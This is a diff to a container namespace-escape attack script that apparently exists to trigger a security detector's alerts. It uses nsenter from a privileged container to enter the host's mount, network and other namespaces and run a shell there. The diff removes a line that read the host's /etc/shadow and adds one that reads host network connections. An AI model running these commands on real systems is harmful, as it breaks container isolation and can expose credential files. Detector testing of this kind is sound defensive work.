@@ -2,6 +2,7 @@
 # ATTACK 5 — Namespace Escape
 # A --privileged --pid=host container uses nsenter/setns to join
 # host namespaces (mount, net, pid, uts, ipc) and break all isolation.
+# Does NOT read credential files (that's attack 4).
 set -e
 
 echo "=== ATTACK 5: Namespace Escape ==="
@@ -27,15 +28,15 @@ echo "[*] nsenter -t 1 -m -- hostname"
 HOST=$(nsenter -t 1 -m -- hostname 2>/dev/null)
 [ -n "$HOST" ] && echo "[!] ESCAPED — host hostname: $HOST"
 
-# Step 3: Read host /etc/shadow via mount NS
-echo "[*] nsenter -t 1 -m -- cat /etc/shadow"
-SHADOW=$(nsenter -t 1 -m -- cat /etc/shadow 2>/dev/null | head -3)
-[ -n "$SHADOW" ] && echo "[!] ESCAPED — host /etc/shadow readable"
+# Step 3: nsenter into host network namespace
+echo "[*] nsenter -t 1 -n -- cat /proc/net/tcp | head -3"
+NET=$(nsenter -t 1 -n -- cat /proc/net/tcp 2>/dev/null | head -3)
+[ -n "$NET" ] && echo "[!] ESCAPED — can see host network connections"
 
-# Step 4: Full namespace escape
-echo "[*] nsenter -t 1 -m -u -i -n -p -- id"
-FULL=$(nsenter -t 1 -m -u -i -n -p -- /bin/sh -c 'whoami && hostname' 2>/dev/null)
-[ -n "$FULL" ] && echo "[!] FULL ESCAPE — running as: $FULL"
+# Step 4: Full namespace escape (all namespaces at once)
+echo "[*] nsenter -t 1 -m -u -i -n -p -- whoami && hostname"
+FULL=$(nsenter -t 1 -m -u -i -n -p -- /bin/sh -c 'echo "user=$(whoami) host=$(hostname)"' 2>/dev/null)
+[ -n "$FULL" ] && echo "[!] FULL ESCAPE — $FULL"
 
 echo ""
 echo "=== Attack complete — check detector for NAMESPACE-ESCAPE alerts ==="
